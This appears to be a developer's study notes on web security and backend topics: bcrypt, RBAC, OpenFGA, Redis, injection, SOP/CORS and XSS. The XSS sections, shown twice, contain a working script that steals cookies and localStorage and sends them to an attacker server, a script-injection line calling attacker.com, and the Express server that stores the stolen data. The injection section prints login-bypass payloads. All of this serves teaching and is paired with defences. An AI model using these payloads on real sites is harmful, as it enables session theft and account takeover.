## 🚨 Limitations of the Current Authentication System

The current implementation has several security and control limitations that should be addressed in future updates.

### 1. Client-Controlled Cookie Expiry
Users can manually modify and extend the cookie expiration date in their browser, allowing sessions to remain valid longer than intended.

### 2. UID Tampering / Account Takeover Risk
A user can change their stored `uid` to another user’s ID and potentially gain unauthorized access to another account.

### 3. No Server-Side Session Invalidation
There is currently no way to manually log out a user from the server side without:
- Deleting the user, or
- Changing the user’s ID

This prevents forced logout or emergency session revocation.

### 4. No Device / Session Limits
The system cannot:
- Limit the number of devices a user can log in from
- Track active sessions per user

This makes it impossible to enforce device restrictions or detect suspicious logins.

### 5. Database Leak = Account Compromise
If the database is compromised, an attacker can access user accounts without needing passwords because sessions are not securely tied to server-side validation.

---

## ⚠️ Summary
The current approach relies heavily on client-side trust and lacks proper server-side session management, making it vulnerable to session hijacking and unauthorized access.

### 🔐 Future Improvements
- Server-side session storage
- Token rotation and revocation
- Secure session validation
- Device/session tracking



this i s new line .... now this is an extra new line to see how the pr works and the merge req works 


# 🔐 bcrypt — Password Hashing Notes

## What is bcrypt?

**bcrypt** is a password-hashing algorithm designed specifically for securely storing passwords.  
It is intentionally **slow and salted** to protect against brute-force and rainbow-table attacks.

---

## Why we use bcrypt

Never store plain passwords:

password: mypassword123 ❌


Instead store a bcrypt hash:


password: $2b$10$KYVbZ5JFVfqu0oV98LnF5eTk4QTe2e4PQG7QNYfhumEpGdi/867AO ✅


If the database leaks, attackers still can’t see the real password.

---

## How bcrypt hashes a password

When you call:

```js
const hash = await bcrypt.hash(password, 10);

bcrypt automatically:

Generates a random salt

Combines password + salt

Runs a slow hashing algorithm

Stores salt + cost + hash in one string

Example bcrypt hash format
$2b$10$KYVbZ5JFVfqu0oV98LnF5eTk4QTe2e4PQG7QNYfhumEpGdi/867AO
│ │  │
│ │  └─ Cost factor (work factor)
│ └──── Algorithm version
└────── Prefix
Cost Factor (Work Factor)

Controls how slow hashing is.

bcrypt.hash(password, 10);

Cost = 10 → 2¹⁰ hashing rounds

Higher cost = more secure but slower.

Typical values:

10 → normal apps

12 → high security

How bcrypt compares passwords

Login code:

const isMatch = await bcrypt.compare(password, user.password);

bcrypt internally:

Extracts salt + cost from stored hash

Hashes the entered password again

Compares hashes safely (constant-time comparison)

Returns true / false

So you never manually handle salt or hashing during login.



1️⃣ Important rule: bcrypt hashes are self-contained

A bcrypt hash is not just the hash.
It already stores everything needed to verify the password later.

Example hash:

$2b$10$QpMUWmS1O8YcLlUopE9lkOcS5TmN.UDb44YdoGZh9rhsCJD7vX95e

It contains 3 parts:

Part	Meaning
$2b$	Algorithm version
$10$	Cost factor (rounds)
QpMUWmS1O8YcLlUopE9lkO	Salt
Remaining string	Final hash

So the database only needs to store one string.

2️⃣ What happens during signup (hashing)

When user creates password:

hash = bcrypt.hash(password, rounds)

bcrypt does:

Generate random salt

Combine → password + salt

Run expensive hashing algorithm

Store → algorithm + rounds + salt + hash

This is why hashing the same password twice gives different hashes.

3️⃣ What happens during login (verification)

User enters password → we do NOT decrypt the stored hash.

Instead bcrypt does this:

Extract salt + rounds from stored hash

Re-hash the entered password using that salt

Compare new hash with stored hash

If equal → password is correct ✅

So bcrypt verification = rehash + compare

4️⃣ Why the first 29 characters matter

First 29 chars:

$2b$10$QpMUWmS1O8YcLlUopE9lkO

This contains:

algorithm

cost factor

salt

If we reuse this part while hashing again → bcrypt recreates the same hash.

That’s exactly what bcrypt.compare() secretly does.

5️⃣ Why we use bcrypt.compare() in real apps

Your manual method works, but compare() is safer because it:

prevents timing attacks (constant-time comparison)

avoids manual mistakes

is the official secure method

💻 Same code with intuitive naming

Here’s your demo rewritten cleanly and clearly 👇

import bcrypt from "bcrypt";

// 🔒 Stored hash from database
const storedPasswordHash =
  "$2b$10$QpMUWmS1O8YcLlUopE9lkOcS5TmN.UDb44YdoGZh9rhsCJD7vX95e";

// 👤 Password entered during login
const enteredPassword = "password";

// ✂️ Step 1: Extract algorithm + rounds + salt (first 29 chars)
const saltAndCostFromHash = storedPasswordHash.substring(0, 29);

// 🔁 Step 2: Re-hash entered password using same salt + rounds
const recreatedHash = bcrypt.hashSync(
  enteredPassword,
  saltAndCostFromHash
);

// ⚖️ Step 3: Compare hashes
const isPasswordCorrect = recreatedHash === storedPasswordHash;

console.log("Password matches:", isPasswordCorrect);

Output:

Password matches: true
🧠 One-line exam answer

bcrypt verifies passwords by extracting the salt and cost from the stored hash, re-hashing the entered password with them, and comparing the hashes.



// RBAC

# RBAC (Role-Based Access Control)

## What is RBAC?

**RBAC (Role-Based Access Control)** is a security model where **permissions are assigned to roles**, and **users are assigned to roles**.

Instead of giving permissions directly to users, we give them to **roles**, and users inherit those permissions through the role.

---

## Basic Idea

```
User → Role → Permissions
```

Example:

| User    | Role   | Permissions            |
| ------- | ------ | ---------------------- |
| Alice   | Admin  | Create, Delete, Update |
| Bob     | Editor | Update                 |
| Charlie | Viewer | Read                   |

---

## Key Components

### 1. User

A person or system that interacts with the application.

Example:

```
User: Jeffrey
User ID: 123
```

---

### 2. Role

A collection of permissions.

Examples of roles:

* Admin
* Editor
* Viewer
* Manager

Example:

```
Role: Admin
```

---

### 3. Permission

An action that can be performed.

Examples:

* create_user
* delete_post
* read_file
* update_profile

---

### 4. Resource

The object being accessed.

Examples:

* User
* File
* Document
* API endpoint

Example:

```
Permission: delete_user
Resource: user
```

---

## Example RBAC Structure

```
Users
 ├── Alice
 ├── Bob
 └── Charlie

Roles
 ├── Admin
 ├── Editor
 └── Viewer

Permissions
 ├── Create
 ├── Read
 ├── Update
 └── Delete
```

Mapping:

```
Admin  → Create, Read, Update, Delete
Editor → Read, Update
Viewer → Read
```

---

## Example Database Design

### Users Table

| id | name  | role_id |
| -- | ----- | ------- |
| 1  | Alice | 1       |
| 2  | Bob   | 2       |

---

### Roles Table

| id | role   |
| -- | ------ |
| 1  | Admin  |
| 2  | Editor |
| 3  | Viewer |

---

### Permissions Table

| id | permission |
| -- | ---------- |
| 1  | create     |
| 2  | read       |
| 3  | update     |
| 4  | delete     |

---

### Role_Permissions Table

| role_id | permission_id |
| ------- | ------------- |
| 1       | 1             |
| 1       | 2             |
| 1       | 3             |
| 1       | 4             |
| 2       | 2             |
| 2       | 3             |

---

## Example Flow

1. User logs in.
2. System retrieves the user's **role**.
3. System checks **permissions assigned to that role**.
4. Access is granted or denied.

Example:

```
User: Bob
Role: Editor
Action: Delete Post
```

Check:

```
Editor → Read, Update
```

Result:

```
Access Denied
```

---

## Example in Backend (Pseudo Code)

```
if user.role == "admin":
    allow access

if user.role == "editor" and action == "update":
    allow access
else:
    deny access
```

---

## Advantages of RBAC

### 1. Easy to manage

Permissions are managed through roles instead of individual users.

### 2. Scalable

Works well for large systems with many users.

### 3. Secure

Reduces mistakes in permission assignments.

### 4. Clean architecture

Centralized permission logic.

---

## Example in Real Systems

| System       | Roles                          |
| ------------ | ------------------------------ |
| GitHub       | Owner, Maintainer, Contributor |
| Google Drive | Editor, Viewer                 |
| Slack        | Admin, Member                  |
| AWS IAM      | Admin, Developer               |

---

## RBAC vs Other Models

| Model | Description                       |
| ----- | --------------------------------- |
| RBAC  | Access based on roles             |
| ABAC  | Access based on attributes        |
| ACL   | Access control lists per resource |

---

## Simple RBAC Example

```
Admin
 ├── create_user
 ├── delete_user
 └── update_user

Editor
 ├── update_post
 └── read_post

Viewer
 └── read_post
```

---

## When to Use RBAC

RBAC is useful when:

* There are **many users**
* Permissions are **similar across groups**
* You want **simple permission management**

---

## Summary

RBAC works like this:

```
Users → assigned to → Roles → contain → Permissions
```

This makes permission management **organized, scalable, and secure**.



# Google Zanzibar and OpenFGA (Easy Explanation)

## 1. What Problem Do They Solve?

Large applications (like Google Drive, Slack, GitHub, etc.) need to answer questions like:

* Can **Alice** view this document?
* Can **Bob** edit this folder?
* Is **Charlie** an admin of this organization?

These are called **authorization checks**.

As applications grow, managing permissions becomes very complex.
Google built **Zanzibar** to solve this problem at massive scale.

---

# 2. Google Zanzibar

## What is Zanzibar?

**Google Zanzibar** is a **global authorization system** created by Google to manage permissions across many products.

It powers permissions for systems like:

* Google Drive
* YouTube
* Google Photos
* Google Docs
* Google Cloud

Instead of every service managing permissions itself, **Zanzibar becomes a centralized permission system**.

---

## Simple Idea

Instead of storing permissions everywhere, Zanzibar stores them in **one system** and services ask it questions.

Example:

```
User → wants to access document
        ↓
Service asks Zanzibar
        ↓
"Can this user access this document?"
        ↓
Zanzibar replies YES / NO
```

---

## Example Permission

Suppose we have:

```
User: Alice
Document: report.pdf
Role: viewer
```

Zanzibar stores this relationship.

When Alice tries to open the file:

```
Check:
Can Alice view report.pdf ?
```

Zanzibar responds:

```
YES
```

---

## How Zanzibar Stores Permissions

Zanzibar stores permissions as **relationships**.

Example:

```
user:alice → viewer → document:report
user:bob → editor → document:report
user:carol → owner → document:report
```

This allows complex permission checks.

---

## Why Zanzibar is Powerful

Zanzibar can handle:

* Billions of permission checks
* Millions of users
* Very complex relationships

Example checks:

```
Is user an admin?
Is user part of a group that owns the file?
Is user a manager of someone who owns the document?
```

---

# 3. OpenFGA

## What is OpenFGA?

**OpenFGA** is an **open-source authorization system inspired by Google Zanzibar**.

It lets developers use the same ideas as Zanzibar in their own applications.

Website:

```
https://openfga.dev
```

---

## What OpenFGA Does

OpenFGA answers questions like:

```
Can user X perform action Y on resource Z?
```

Example:

```
Can Alice edit document123?
```

OpenFGA returns:

```
true / false
```

---

## Example Permission Model

Example:

```
User: alice
Document: doc1
Role: editor
```

Relationship stored:

```
user:alice → editor → document:doc1
```

Permission check:

```
Can alice edit doc1 ?
```

Answer:

```
true
```

---

# 4. Example in a Drive-like App

Imagine your **Drive application**.

Users:

```
Alice
Bob
Charlie
```

Files:

```
file1
file2
```

Permissions:

```
alice → owner → file1
bob → viewer → file1
charlie → editor → file2
```

Permission check:

```
Can Bob edit file1 ?
```

OpenFGA checks rules:

```
viewer → cannot edit
```

Result:

```
false
```

---

# 5. Why Use Systems Like This?

Without a centralized authorization system:

* permissions are scattered across services
* logic becomes complicated
* security bugs increase

With Zanzibar/OpenFGA:

```
All permissions → stored in one system
All services → ask that system
```

Benefits:

* consistent permissions
* scalable
* secure
* easier to manage

---

# 6. Comparison

| System          | Description                                     |
| --------------- | ----------------------------------------------- |
| Google Zanzibar | Internal Google authorization system            |
| OpenFGA         | Open-source implementation inspired by Zanzibar |

---

# 7. Example Flow with OpenFGA

```
User tries to access file
        ↓
Backend asks OpenFGA
        ↓
check(user, action, resource)
        ↓
OpenFGA returns true/false
        ↓
Backend allows or denies access
```

---

# 8. Real-World Example

For a Drive-like system:

```
user:alice → owner → folderA
folderA contains file1
```

So permission becomes:

```
alice can access file1 because she owns folderA
```

Zanzibar/OpenFGA handle these complex rules automatically.

---

# 9. Key Idea

Both systems answer one main question:

```
Can USER perform ACTION on RESOURCE?
```

Example:

```
Can Alice delete file123 ?
```

Answer:

```
Yes / No
```

---

# 10. Summary

**Google Zanzibar**

* Google's internal authorization system
* manages permissions across Google services
* handles billions of checks

**OpenFGA**

* open-source system inspired by Zanzibar
* allows developers to build scalable permission systems

Both systems help solve **large-scale authorization problems**.




# Redis Guide

## What is Redis?

**Redis (Remote Dictionary Server)** is an **open-source in-memory data store** used as:

* Cache
* Database
* Session store
* Message broker
* Queue system

Redis stores data **in RAM instead of disk**, which makes it extremely fast.

Many large systems like **Twitter, GitHub, Pinterest, and StackOverflow** use Redis for high-performance applications.

---

# Why Redis is Fast

Traditional databases store data on **disk**.

Disk operations are slower compared to **RAM access**.

| Storage | Speed             |
| ------- | ----------------- |
| RAM     | ~100 nanoseconds  |
| SSD     | ~100 microseconds |
| HDD     | ~10 milliseconds  |

Because Redis stores data **in memory**, it can handle **millions of operations per second**.

---

# Redis Data Structure

Redis is primarily a **Key-Value store**.

```
KEY -> VALUE
```

Example:

```
user:1001 -> {name: "Jeffrey", age: 21}
session:abc123 -> userId:1001
product:45 -> price:1200
```

---

# Redis Data Types

Redis supports multiple data types.

## String

Most common type.

```
SET name "Jeffrey"
GET name
```

---

## List

Ordered collection.

```
LPUSH tasks "task1"
LPUSH tasks "task2"
LRANGE tasks 0 -1
```

---

## Set

Unordered unique values.

```
SADD users "Jeffrey"
SADD users "Alice"
SMEMBERS users
```

---

## Hash

Used for storing objects.

```
HSET user:1 name "Jeffrey"
HSET user:1 age 21
HGETALL user:1
```

---

## Sorted Set

Values sorted by score.

```
ZADD leaderboard 100 "Jeffrey"
ZADD leaderboard 200 "Alice"
ZRANGE leaderboard 0 -1
```

---

# Redis as Cache (Improving Speed)

One major use of Redis is **caching**.

### Problem Without Cache

Client → Server → Database → Response

Database queries can be slow if:

* many users access the system
* complex queries
* heavy traffic

---

### With Redis Cache

Client → Server → **Redis Cache** → Database

Flow:

1. Server first checks Redis
2. If data exists → return immediately
3. If not → fetch from database
4. Store result in Redis
5. Return to client

Example:

```
GET product:45
```

If exists in Redis → fast response.

If not:

1. Fetch from DB
2. Store in Redis

```
SET product:45 "Laptop"
```

---

# Redis for Session Management

Redis is widely used to store **user sessions**.

Sessions are needed when users login to applications.

Example:

User logs into website.

Server creates a session.

```
session:abc123 -> userId:45
```

Redis stores this session.

When user makes another request:

Server checks Redis:

```
GET session:abc123
```

If exists → user is authenticated.

---

### Why Redis is Good for Sessions

1. Very fast
2. Supports expiration
3. Handles millions of sessions
4. Prevents database overload

---

# Session Expiration

Redis allows automatic expiration.

Example:

```
SET session:abc123 userId45
EXPIRE session:abc123 3600
```

Session will automatically delete after **1 hour**.

This is useful for:

* login sessions
* OTP storage
* temporary tokens

---

# Redis vs Traditional Database

| Feature  | Redis           | SQL Database   |
| -------- | --------------- | -------------- |
| Storage  | Memory          | Disk           |
| Speed    | Extremely Fast  | Slower         |
| Query    | Key-Value       | SQL            |
| Use Case | Cache, Sessions | Permanent Data |

Redis is usually used **along with databases**, not as a replacement.

Example architecture:

```
Client
  |
Server
  |
Redis (Cache)
  |
Database (PostgreSQL / MongoDB)
```

---

# Common Redis Commands

### Set value

```
SET key value
```

Example:

```
SET name "Jeffrey"
```

---

### Get value

```
GET name
```

---

### Delete key

```
DEL name
```

---

### Set expiration

```
EXPIRE key seconds
```

---

### Check if key exists

```
EXISTS key
```

---

# Redis Use Cases

Redis is used for:

### 1. Caching

Reducing database load.

Example:

* product data
* user profile
* API response

---

### 2. Session Storage

Storing login sessions.

Used by:

* Express.js
* Django
* Spring Boot

---

### 3. Rate Limiting

Prevent API abuse.

Example:

Limit users to **100 requests per minute**.

---

### 4. Queues

Used for background jobs.

Example:

* email sending
* notifications
* job processing

Tools:

* BullMQ
* Sidekiq
* Celery

---

### 5. Leaderboards

Gaming applications.

Example:

Top scores using **Sorted Sets**.

---

# Advantages of Redis

* Extremely fast
* Supports multiple data structures
* Built-in expiration
* Highly scalable
* Easy to use
* Large ecosystem

---

# Disadvantages of Redis

* Uses RAM (memory cost)
* Not ideal for large persistent data
* Data loss possible if not configured for persistence

---

# Redis Persistence

Redis can save data to disk using:

### RDB (Snapshot)

Periodic backups.

### AOF (Append Only File)

Logs every operation.

---

# Simple Redis Workflow Example

Example for caching user data.

1. User requests profile

```
GET user:45
```

2. If not found

Fetch from database.

3. Store in Redis

```
SET user:45 "Jeffrey"
```

4. Next request

Redis returns data instantly.

---

# Basic Redis Architecture

```
User
 |
API Server
 |
Redis (Cache / Session)
 |
Database
```

Redis reduces database load and improves performance.

---

# Summary

Redis is a **high-speed in-memory data store** used for:

* Caching
* Session management
* Rate limiting
* Message queues
* Leaderboards

It dramatically improves **application speed and scalability** by reducing database workload.


# 🛡️ SQL / NoSQL Injection Security Guide (MERN Stack)

## 📖 Overview

Injection attacks are one of the most dangerous vulnerabilities in web applications.

Even though the MERN stack uses **MongoDB (NoSQL)** instead of SQL, the same concept applies:

> ⚠️ If you trust user input blindly, attackers can manipulate your database queries.

---

## 💡 What is SQL Injection?

**SQL Injection (SQLi)** is when an attacker injects malicious SQL code into input fields to:

- Bypass authentication  
- Access sensitive data  
- Modify or delete database records  

---

## 💥 Classic SQL Injection Example

### ❌ Vulnerable Code

    const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;

### 🔥 Malicious Input

    email: admin@example.com
    password: ' OR '1'='1

### 💣 Final Query Becomes

    SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1';

👉 This condition is always TRUE → attacker logs in without password

---

## ⚠️ NoSQL Injection (MongoDB in MERN)

MongoDB is not immune — it suffers from **NoSQL Injection**

---

## 💥 Example in MERN

### ❌ Vulnerable Code

    const user = await User.findOne({
      email: req.body.email,
      password: req.body.password
    });

### 🔥 Malicious Input (JSON)

    {
      "email": { "$ne": null },
      "password": { "$ne": null }
    }

### 💣 What Happens?

MongoDB interprets:

    { email: { $ne: null }, password: { $ne: null } }

👉 This means:
- email ≠ null → true for many users  
- password ≠ null → true  

🚨 Result: attacker logs in as **any user**

---

## 🚨 Real Risks for Your Drive App

If you're building something like Google Drive:

- 📂 Unauthorized file access  
- 🔓 Account takeover  
- 🗑️ File deletion or modification  
- 📤 Data leaks (private files exposed)  

---

## 🔐 How to Prevent Injection Attacks

### 1. ✅ Never Trust User Input

Always validate and sanitize input before using it.

---

### 2. ✅ Use Mongoose Safely

Avoid passing raw objects directly from user input:

    // ❌ Bad
    User.findOne(req.body);

    // ✅ Good
    User.findOne({
      email: String(req.body.email),
      password: String(req.body.password)
    });

---

### 3. ✅ Disable MongoDB Operators from Input

Attackers use operators like:

- $ne  
- $gt  
- $or  

Install sanitizer:

    npm install mongo-sanitize

Usage:

    import mongoSanitize from "mongo-sanitize";

    const clean = mongoSanitize(req.body);

---

### 4. ✅ Use Strict Schema Validation

    const userSchema = new mongoose.Schema({
      email: { type: String, required: true },
      password: { type: String, required: true }
    }, { strict: true });

---

## 🧠 Role of Zod in Security

### 📌 What is Zod?

Zod is a **TypeScript-first schema validation library** used to validate user input.

---

## 🔐 How Zod Helps Prevent Injection

Zod ensures:

- Input is of correct type  
- No unexpected objects are allowed  
- Prevents malicious payloads like `{ $ne: null }`  

---

## ✅ Example with Zod

    import { z } from "zod";

    const loginSchema = z.object({
      email: z.string().email(),
      password: z.string().min(6)
    });

---

### 🚫 Attack Attempt

    {
      "email": { "$ne": null },
      "password": { "$ne": null }
    }

### ❌ Zod Result

    ZodError: Expected string, received object

👉 Attack blocked before hitting database

---

## 🔒 Using Zod in Express Middleware

    const validate = (schema) => (req, res, next) => {
      try {
        req.body = schema.parse(req.body);
        next();
      } catch (err) {
        return res.status(400).json({ error: err.errors });
      }
    };

---

## 🚀 Best Practices Summary

- ✅ Always validate input (Zod)  
- ✅ Sanitize input (mongo-sanitize)  
- ✅ Avoid dynamic queries  
- ✅ Use strict schemas  
- ✅ Never trust client-side validation alone  
- ✅ Hash passwords (bcrypt)  
- ✅ Use authentication tokens (JWT)  

---

## 🧩 Final Thought

> Injection attacks are not about SQL or MongoDB —  
> they are about trusting user input blindly.

If you:
- Validate (Zod)  
- Sanitize  
- Control query structure  

👉 You eliminate most real-world attacks



# 🌐 Understanding Same-Origin Policy (SOP)

## 📖 What is Same-Origin Policy?

Same-Origin Policy (SOP) is a **browser security rule** that restricts how web pages interact with each other.

> 👉 A website can only access resources from the SAME origin.

---

## 🧠 What is an Origin?

An origin is defined by:

    protocol + host + port

---

## ✅ Same Origin Example

    http://example.com:80
    http://example.com:80

✔ Same protocol  
✔ Same domain  
✔ Same port  

👉 SAME ORIGIN ✅

---

## ❌ Different Origin Examples

### 1. Different Protocol

    http://example.com
    https://example.com

👉 DIFFERENT ORIGIN ❌

---

### 2. Different Domain

    https://example.com
    https://api.example.com

👉 DIFFERENT ORIGIN ❌ (subdomain counts!)

---

### 3. Different Port

    http://localhost:3000
    http://localhost:4000

👉 DIFFERENT ORIGIN ❌

---

## ❗ What DOES NOT affect origin

### Path

    https://example.com/page1
    https://example.com/page2

👉 SAME ORIGIN ✅

---

### Query Params

    https://example.com?x=1
    https://example.com?x=2

👉 SAME ORIGIN ✅

---

### Hash

    https://example.com#home
    https://example.com#about

👉 SAME ORIGIN ✅

---

## 🔐 Why Same-Origin Policy exists

To prevent malicious websites from:

- ❌ Reading your bank data
- ❌ Accessing cookies from other sites
- ❌ Making unauthorized requests

---

## 💥 Example Attack (Without SOP)

Imagine:

    You are logged into bank.com

Then you visit:

    evil.com

Without SOP, evil.com could:

- Read your bank account data ❌
- Steal session cookies ❌

👉 SOP prevents this

---

## ⚠️ SOP Restricts

- Reading API responses from another origin
- Accessing DOM of another site
- Accessing cookies of another domain

---

## 🚀 Then how do apps communicate?

👉 Using **CORS (Cross-Origin Resource Sharing)**

---

## 🔓 CORS Example (Backend - Express)

    app.use(cors({
      origin: "http://localhost:5173",
      credentials: true
    }));

👉 Allows frontend to talk to backend

---

## 💻 Real Project Example (MERN)

    Frontend: http://localhost:5173
    Backend:  http://localhost:4000

👉 Different ports → DIFFERENT ORIGIN ❌

➡️ Need CORS to allow communication

---

## 🧠 Important Rule

> If protocol OR domain OR port changes → origin changes

---

## 🧩 SOP vs CORS

| Feature | Purpose |
|--------|--------|
| SOP | Blocks cross-origin access |
| CORS | Allows controlled access |

---

## 🔥 TL;DR

- Origin = protocol + domain + port  
- Same origin → full access  
- Different origin → blocked by default  
- CORS → allows safe communication  

---

## 💬 Final Thought

> SOP protects users  
> CORS enables developers  

Both together make the web secure AND usable




# 🚨 XSS Attack Demo (Client + Attacker Server)

## 📖 Overview

This demonstrates how a **Cross-Site Scripting (XSS)** attack works:

1. Attacker injects a script into a vulnerable website  
2. That script loads a malicious JS file  
3. Malicious JS steals user data (cookies + localStorage)  
4. Data is sent to attacker’s server  
5. Attacker stores the stolen data  

---

# 🧠 Part 1: Injected Script (Client-side)

```js
const s = document.createElement("script");
s.src = "http://localhost:8000/steal.js";
document.body.appendChild(s);
🔍 What this does

Dynamically creates a <script> tag

Loads external JS from attacker server

Executes it inside victim’s browser

Equivalent to:

<script src="http://localhost:8000/steal.js"></script>
⚠️ Why this is dangerous

Browser trusts this script (runs in your site's context)

It can access:

cookies 🍪

localStorage 📦

DOM 🧾

🧠 Part 2: Malicious Script (steal.js)
async function stealData() {
  const cookies = document.cookie
    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
    : {};

  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  if (Object.keys(cookies).length || Object.keys(localStorageData).length) {
    const response = await fetch("http://localhost:8000/victim", {
      method: "POST",
      body: JSON.stringify({ cookies, localStorage: localStorageData }),
      headers: {
        "Content-Type": "application/json",
      },
    });

    const data = await response.json();
    console.log(data);
  } else {
    console.log("Could not steal anything. Your website is very secure.");
  }
}

stealData();
🔍 What this script does
1. 🍪 Reads cookies
document.cookie

Converts:

token=abc123; user=jeff

Into:

{
  token: "abc123",
  user: "jeff"
}
2. 📦 Reads localStorage
localStorage.getItem(key)

Collects:

{
  token: "jwt_token",
  user: "jeff"
}
3. 🚀 Sends data to attacker
fetch("http://localhost:8000/victim", {...})

👉 Sends stolen data to attacker server

🧠 Part 3: Attacker Server (Express + MongoDB)
import express from "express";
import mongoose from "mongoose";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

await mongoose.connect(
  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
);

const victimSchema = new mongoose.Schema({
  cookies: {},
  localStorage: {},
  website: String,
});

const Victim = mongoose.model("victim", victimSchema);

// Serve malicious files (like steal.js)
app.use(express.static("./public"));

app.post("/victim", async (req, res) => {
  const { cookies, localStorage } = req.body;

  console.log(req.body);

  const victim = await Victim.create({
    localStorage: localStorage,
    cookies: cookies,
    website: req.headers.origin,
  });

  return res
    .status(201)
    .json({ message: "Stolen all this data.", data: victim });
});

app.listen(8000, () =>
  console.log("Server running on http://localhost:8000")
);
🔍 What this server does
1. 📂 Serves malicious script
app.use(express.static("./public"));

👉 Makes steal.js available at:

http://localhost:8000/steal.js
2. 📥 Receives stolen data
app.post("/victim", ...)

👉 Receives:

{
  "cookies": {...},
  "localStorage": {...}
}
3. 💾 Stores stolen data
await Victim.create({...})

👉 Saves into MongoDB

4. 🌐 Tracks victim site
website: req.headers.origin

👉 Records which website was attacked

💥 Full Attack Flow
Attacker injects script
        ↓
Victim loads webpage
        ↓
Browser loads steal.js from attacker server
        ↓
steal.js reads cookies + localStorage
        ↓
Sends data to /victim
        ↓
Server stores stolen data in MongoDB
⚠️ Why this works

Script runs inside victim’s site (trusted context)

Browser allows access to:

cookies (unless httpOnly)

localStorage

SOP does NOT stop this (same-origin execution)

🔐 How to Prevent This
✅ 1. Use HTTP-only cookies
res.cookie("token", token, {
  httpOnly: true,
});
✅ 2. Avoid innerHTML
// ❌ unsafe
div.innerHTML = userInput;

// ✅ safe
div.textContent = userInput;
✅ 3. Use React safely
<p>{userInput}</p> // auto-escaped
❌ Avoid
dangerouslySetInnerHTML={{ __html: userInput }}
✅ 4. Content Security Policy (CSP)
Content-Security-Policy: script-src 'self'

👉 Blocks external scripts

🧩 Key Takeaway

XSS allows attackers to run JavaScript inside your website
→ which lets them steal user data

🚀 TL;DR

Inject script → load malicious JS

JS steals cookies + localStorage

Sends data to attacker server

Server stores everything

👉 Protect by:

validating input

avoiding raw HTML rendering

using httpOnly cookies

applying CSP


---

If you want next, I can:
👉 show how to **simulate this attack on your own MERN app safely**  
👉 or help you **secure your auth system against XSS completely** 🔐





# 🛡️ Complete Web Security Notes (SOP + XSS + Script Injection + onerror)

---

# 🌐 1. Same-Origin Policy (SOP)

## 📖 What is SOP?

Same-Origin Policy is a **browser security rule** that prevents one website from reading sensitive data from another website.

> 👉 Origin = protocol + domain + port

---

## 🧠 Examples

### ❌ Different Origin

http://localhost:3000  
http://localhost:4000  

👉 Different port → NOT same origin

---

### ✅ Same Origin

https://example.com  
https://example.com/page  

👉 Path doesn’t matter → SAME origin

---

## 🔐 What SOP Prevents

- ❌ Reading API responses from other sites  
- ❌ Accessing cookies from another domain  
- ❌ Accessing DOM of another site  
- ❌ Reading localStorage/sessionStorage  

---

## ⚠️ Important

👉 SOP **allows sending requests**  
👉 SOP **blocks reading responses**

---

# 🚨 2. What is XSS (Cross-Site Scripting)

## 📖 Definition

XSS is when an attacker injects **malicious JavaScript into your website**, which runs in other users’ browsers.

---

## 💥 Example

```html
<script>alert("Hacked")</script>


⚔️ 3. XSS Attack Flow

Attacker injects input
↓
Website renders it unsafely
↓
Browser executes malicious JS
↓
JS steals cookies/localStorage
↓
Sends data to attacker

🧪 4. Script Injection (Dynamic Script Tag)
📌 Code
const s = document.createElement("script");
s.src = "http://attacker.com/steal.js";
document.body.appendChild(s);
🧠 What happens

Creates <script> tag

Loads external JS

Runs inside your site

Equivalent to:

<script src="http://attacker.com/steal.js"></script>
🧪 5. Malicious Script (steal.js)
📌 Code
async function stealData() {
  const cookies = document.cookie
    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
    : {};

  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  await fetch("http://localhost:8000/victim", {
    method: "POST",
    body: JSON.stringify({ cookies, localStorage: localStorageData }),
    headers: {
      "Content-Type": "application/json",
    },
  });
}

stealData();
🔍 What this does
🍪 Step 1: Reads cookies
document.cookie
📦 Step 2: Reads localStorage
localStorage.getItem(key)
📡 Step 3: Sends data to attacker
fetch("http://localhost:8000/victim", ...)
🖥️ 6. Attacker Server (Express + MongoDB)
📌 Code
import express from "express";
import mongoose from "mongoose";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

await mongoose.connect(
  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
);

const victimSchema = new mongoose.Schema({
  cookies: {},
  localStorage: {},
  website: String,
});

const Victim = mongoose.model("victim", victimSchema);

// Serve malicious JS
app.use(express.static("./public"));

app.post("/victim", async (req, res) => {
  const { cookies, localStorage } = req.body;

  const victim = await Victim.create({
    localStorage,
    cookies,
    website: req.headers.origin,
  });

  res.status(201).json({ message: "Data stored", data: victim });
});

app.listen(8000, () => console.log("Server running"));
🧠 What this server does

Serves malicious file (steal.js)

Receives stolen data

Stores it in MongoDB